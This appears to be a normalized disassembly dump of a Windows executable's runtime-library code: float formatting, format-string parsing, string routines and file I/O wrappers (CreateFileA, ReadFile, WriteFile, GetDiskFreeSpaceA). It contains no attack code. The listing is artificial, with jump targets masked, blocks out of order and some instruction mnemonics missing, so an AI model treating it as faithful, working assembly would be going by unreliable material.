fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40832c
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_408260
mov edx esi
pop eax
call sub_40405c
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408354
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_4081f4
mov edx esi
pop eax
call sub_40405c
add esp 0x20
pop esi
retn
xor edx edx
sub_40837c
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c50
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407e48
sub_4083d0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c50
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4083f0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404de4
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408410
mov eax [ rw-data ]
call sub_405014
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_405014
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051d0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fc0
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051d0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fc0
sub_4084a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_408108
test al al
je r-xdata
sub_4084dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409720
mov edx eax
test dl dl
je r-xdata
call sub_408410
push ebp
mov eax [ rw-data ]
call sub_40501c
mov edx eax
mov eax [ rw-data ]
call sub_4084a0
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_40501c
mov edx eax
mov eax [ rw-data ]
call sub_4084a0
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408578
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fc0
call sub_408410
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fc0
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fc0
jmp r-xdata
pop esi
pop ebx
retn
sub_4085c4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_40442c
push eax
call CreateFileA
sub_40861c
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_40442c
push eax
call CreateFileA
pop ebx
retn
sub_408648
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408674
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4086a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4086e0
push ebx
push esi
mov esi eax
mov eax esi
call sub_40422c
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c2c0
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408710
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_40422c
mov edi eax
mov eax ebx
call sub_40442c
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408a14
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c2c0
cmp al 0x2
jne r-xdata
dec edi
sub_408760
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408710
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_40448c
pop edi
pop esi
pop ebx
retn
sub_408798
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408710
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403f6c
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_40448c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4087e0
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_40442c
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_40405c
add esp 0x108
pop esi
pop ebx
retn
sub_40881c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404dc0
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404dc0
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4088cc
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4088f4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408928
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40422c
push eax
mov eax ebx
call sub_40442c
mov edx eax
mov eax esi
pop ecx
call sub_4088f4
pop esi
pop ebx
retn
sub_40894c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40442c
mov edx eax
mov ecx edi
mov eax ebx
call sub_4088f4
pop edi
pop esi
pop ebx
retn
sub_40896c
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408990
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4089d0
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408a28
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408a9c
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408890
mov esi eax
inc esi
mov eax esi
call sub_408a7c
mov ecx esi
mov edx ebx
call sub_4088bc
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408ad8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c2e4
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4088bc
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407e48
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408b60
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408eb7
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408c42
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408c8a
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408c42
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408b54
pop edx
or edx edx
je r-xdata
sub_408c42
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408eb7
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408c8a
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408eb7
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408ad8
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408cb1 ]
mov ebx ecx
sub cl 0x44
je sub_408260
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404194
jmp r-xdata
mov esi sub_4041f4
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_408260
sub cl 0x44
je sub_4081f4
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_4081f4
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408260
mov ecx 0x10
cmp bl 0x58
je sub_4081f4
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408b30
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_409070
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4081f4
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408ed8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408890
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408b60
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408f18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408890
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408b60
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408f6c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_40422c
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408b60
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_40405c
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403f6c
mov eax esi
mov edx ebx
call sub_4045b8
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408b60
mov edx esi
xchg edx eax
call sub_4045b8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40902c
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_409070
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409344
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_40916f
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_409179
call sub_40916f
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40902c
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_4091d5
call sub_40916f
call sub_409166
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_409166
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40902c
retn
xor ecx ecx
sub_409211
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_409166
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_409166
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_409276
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_4092ca
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409211
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409344
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409371
jmp r-xdata
call sub_409493
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409371
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d70
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409493
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
